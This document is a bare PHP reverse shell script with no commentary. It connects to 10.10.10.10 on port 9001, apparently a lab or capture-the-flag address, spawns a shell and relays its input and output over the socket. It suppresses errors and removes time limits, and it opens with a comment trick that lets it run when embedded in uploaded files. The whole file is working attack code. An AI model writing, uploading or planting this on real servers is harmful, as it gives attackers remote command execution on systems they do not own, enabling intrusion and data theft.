/*<?php /**/
error_reporting(0);
set_time_limit(0);
umask(0);
$addr='10.10.10.10';
$port=9001;
$buf=1024;
$sh='sh';
$s=@fsockopen($addr,$port,$e,$es,30);
if(!$s)exit;
stream_set_blocking($s,0);
$spec=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
$p=@proc_open($sh,$spec,$pipes,null,null);
if(!$p)exit;
foreach($pipes as $pi)stream_set_blocking($pi,0);
while(true){
$st=proc_get_status($p);
if(feof($s)||feof($pipes[1])||!$st['running'])break;
$r=[$s,$pipes[1],$pipes[2]];
if(@stream_select($r,$w=null,$x=null,0)>0){
if(in_array($s,$r))while(($d=@fread($s,$buf))&&@fwrite($pipes[0],$d)){}
if(in_array($pipes[2],$r))while(($d=@fread($pipes[2],$buf))&&@fwrite($s,$d)){}
if(in_array($pipes[1],$r))while(($d=@fread($pipes[1],$buf))&&@fwrite($s,$d)){}
}}
foreach($pipes as $pi)fclose($pi);
proc_close($p);
fclose($s);
?>
